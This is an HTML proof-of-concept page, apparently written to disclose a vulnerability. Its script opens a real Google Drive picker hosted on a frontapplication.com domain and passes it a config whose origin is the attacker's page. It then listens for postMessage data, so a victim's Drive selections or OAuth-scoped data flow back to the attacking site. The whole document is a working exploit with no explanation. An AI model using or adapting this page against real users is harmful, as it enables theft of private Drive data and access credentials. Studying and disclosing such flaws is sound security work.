<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PoC</title>
</head>
<body>
  <h3>Status: <span id="status">Waiting...</span></h3>
  <pre id="output"></pre>

  <script>
    // Configuration
    const PICKER_URL = "https://google-drive-picker.frontapplication.com/google-drive/index.html";
    const MY_ORIGIN = window.location.origin;

    const config = {
      googleAppId: "754490832836",
      googleClientId: "754490832836-gs77odllghgisuja5jecijqihaolr08q.apps.googleusercontent.com",
      googleOAuthScope: "https://www.googleapis.com/auth/drive.readonly",
      googleDriveAllowedMimeTypes: "application/vnd.google-apps.document,application/vnd.google-apps.spreadsheet,application/vnd.google-apps.folder",
      origin: MY_ORIGIN
    };

    // Listen for messages
    window.addEventListener("message", (e) => {
      document.getElementById("status").innerText = "Data Received";
      document.getElementById("output").innerText = JSON.stringify(e.data, null, 2);
    }, false);

    // Open popup
    const url = `${PICKER_URL}?config=${encodeURIComponent(JSON.stringify(config))}`;
    window.open(url, "picker", "width=700,height=600");
  </script>
</body>
</html>
